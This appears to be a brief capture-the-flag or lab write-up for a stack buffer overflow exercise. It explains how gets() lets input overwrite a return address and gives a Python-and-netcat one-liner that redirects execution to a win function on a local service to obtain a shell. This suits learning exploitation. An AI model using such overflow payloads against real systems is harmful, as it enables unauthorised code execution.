ref: 0 | Buffer 1 | jump
===========================

General overview of problems faced
-------------------------------------
- I had to learn how to send hex values as input
- I had an issue figuring out why I was not getting a shell even if my exploit was correct.

List of vulnerabilities
--------------------
1. The input for the user's response to the question is taken using gets which allows for arbitrary length input. Therefore the fixed buffer used to take the response can overflow and you are able to overwrite the return address.

Steps to exploit
------------------
1. Get the win function pointer by running the program.
2. Enter exactly 64 bytes of text and then append the win function address in little endian format. This will overwrite the return address to point to the win function.
3. You now have a shell!

Script/Command used
------------------
```
<!-- Location to jump to: 0x80491d2 -->
(python -c 'print(("A"*64)+"\xd2\x91\x04\x08")'; cat ) | nc localhost 5001
```
